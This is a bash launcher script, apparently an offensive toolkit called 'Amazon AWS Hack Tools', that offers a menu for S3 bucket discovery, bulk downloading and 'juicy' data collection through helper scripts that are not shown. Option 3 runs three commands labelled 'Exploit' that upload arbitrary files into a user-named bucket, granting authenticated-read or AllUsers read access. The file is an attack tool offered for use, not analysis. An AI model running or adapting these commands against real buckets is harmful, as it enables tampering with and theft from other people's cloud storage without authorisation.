#!/bin/bash

red="\e[0;31m"
new="\e[0;36m"
green="\e[0;32m"
off="\e[0m"

clear
function banner() {
echo "
					       Amazon AWS Hack Tools
        					        version 1.0a
					       Coder  - Haroon Awan
"
}
banner
echo "";
echo -e "$red [$green+$red] 1:$off S3 Bucket Finder 	  ";
echo -e "$red [$green+$red] 2:$off S3 No-Request for Buckets ";
echo -e "$red [$green+$red] 3:$off S3 Move Files in Buckets ";
echo -e "$red [$green+$red] 4:$off S3 Download Everything    ";
echo -e "$red [$green+$red] 5:$off S3 Check Bucket Disk Size    ";
echo -e "$red [$green+$red] 6:$off EC2 Juicy Bucket Data    ";

echo "";
echo -ne "$red [$green+$red] Select An Option:$off: " ;
read Option 
echo "";
if [ $Option -eq "1" ]
 then
    ./bucket_finder.rb -h
echo -ne "$red [$green+$red] $off Enter Region: ";
read Region
echo -ne "$red [$green+$red] $off Enter wordlist: ";
read wordlist
ruby bucket_finder.rb -r $Region $wordlist
fi 
if [ $Option -eq "2" ]
 then
    ./no-request.sh
 fi
if [ $Option -eq "3" ]
 then
echo -ne "$red [$green+$red] $off Enter file to upload : ";
read w
echo -ne "$red [$green+$red] $off Enter Bucket Name    : ";
read b
echo -e "$red [$green+$red] $off Exploiting ";
echo "";

echo -ne "$red [$green+$red] $off Exploit 1 : ";
echo "aws s3 local_file $w s3://bucket_here/remote.txt --acl authenticated-read"
aws s3 cp $w s3://$b/remote.txt --acl authenticated-read
echo "";

echo -ne "$red [$green+$red] $off Exploit 2 : ";
echo "aws s3 cp local_file s3://bucket_here --grants read=uri=http://acs.amazonaws.com/groups/global/AllUsers"
aws s3 cp $w s3://$b --grants read=uri=http://acs.amazonaws.com/groups/global/AllUsers
echo "";

echo -ne "$red [$green+$red] $off Exploit 3 : ";
echo "aws mv local_file s3://bucket_here"
aws s3 mv $w s3://$b
echo "";
fi

if [ $Option -eq "4" ]
 then
   ./download_everything.sh
fi

if [ $Option -eq "5" ]
 then 
 ./disk-size.sh
fi

if [ $Option -eq "6" ]
 then 
 ./juicy.sh
fi
